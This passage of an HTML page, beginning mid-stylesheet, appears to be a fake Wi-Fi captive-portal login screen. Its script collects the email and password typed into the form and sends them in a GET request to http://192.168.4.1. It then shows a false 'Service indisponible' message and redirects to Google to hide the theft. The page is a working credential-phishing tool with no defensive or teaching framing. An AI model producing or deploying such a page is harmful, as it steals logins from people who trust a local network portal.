.form-control {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    border: 1px solid #ced4da;
    border-radius: 4px;
    box-sizing: border-box;
	text-align:center;
}

.form-control:focus {
    border-color: #6c757d;
    outline: none;
}

.btn {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 4px;
    background-color: #28a745; /* Couleur verte pour le bouton */
    color: white;
    cursor: pointer;
    transition: background-color 0.3s;
}

.btn:hover {
    background-color: #218838;
}

</head>

<body>
    <div class="login-form">
        <div class="login-image"></div>
        <input type="email" id="email" class="form-control" placeholder="Name">
        <input type="password" id="password" class="form-control" placeholder="Phone Number">
        <button onclick="sendCredentials()" class="btn">Connexion</button>
    </div>

    <script>
        function sendCredentials() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
			alert("Service indisponible.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
</body>
</html>
